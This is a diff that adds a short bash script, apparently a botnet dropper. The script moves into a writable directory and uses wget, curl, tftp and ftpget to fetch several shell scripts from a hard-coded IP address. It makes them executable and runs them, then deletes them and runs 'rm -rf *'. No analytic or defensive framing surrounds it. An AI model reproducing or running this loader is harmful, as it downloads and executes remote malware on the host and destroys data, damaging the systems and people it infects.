@@ -1,0 +1,2 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://81.161.229.190/ohshit.sh; curl -O http://81.161.229.190/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 81.161.229.190 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 81.161.229.190; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 81.161.229.190 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
